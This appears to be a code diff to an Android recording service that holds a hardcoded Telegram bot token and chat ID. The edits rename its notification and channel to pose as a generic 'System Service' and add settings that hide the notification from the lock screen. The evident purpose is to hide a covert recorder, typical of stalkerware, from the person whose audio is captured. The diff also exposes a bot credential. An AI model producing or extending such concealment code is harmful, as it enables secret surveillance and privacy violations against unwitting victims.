@@ -24,7 +24,7 @@ import java.io.File
 class RecorderService : Service() {
 
     companion object {
-        private const val CHANNEL_ID = "rec_ch"
+        private const val CHANNEL_ID = "rec_ch_silent"
         private const val NOTIFICATION_ID = 1
         private const val TOKEN = "8789968045:AAGWbVUOgapMEd-0gHOjbBgRNOUkUwKIQxk"
         private const val CHAT_ID = "8650824010"
@@ -145,10 +145,11 @@ class RecorderService : Service() {
 
     private fun buildNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("dogmind")
-            .setContentText("Active")
+            .setContentTitle("System Service")
+            .setContentText("Background Processing")
             .setSmallIcon(R.drawable.ic_record)
             .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setSilent(true)
             .setOngoing(true)
             .build()
@@ -156,10 +157,11 @@ class RecorderService : Service() {
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(CHANNEL_ID, "Service", NotificationManager.IMPORTANCE_MIN).apply {
+            val ch = NotificationChannel(CHANNEL_ID, "System Services", NotificationManager.IMPORTANCE_MIN).apply {
                 setSound(null, null)
                 enableVibration(false)
                 setShowBadge(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
         }
